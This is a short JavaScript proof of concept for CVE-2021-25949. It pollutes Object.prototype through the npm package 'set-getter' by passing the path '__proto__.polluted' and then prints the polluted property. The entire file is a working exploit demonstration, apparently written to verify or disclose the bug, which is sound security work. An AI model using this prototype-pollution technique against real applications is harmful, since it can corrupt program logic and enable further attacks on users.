//https://www.whitesourcesoftware.com/vulnerability-database/CVE-2021-25949

var setGetter = require("set-getter");

setGetter({}, "__proto__.polluted", function (polluted) {
  return "yes";
});

console.log({}.polluted);
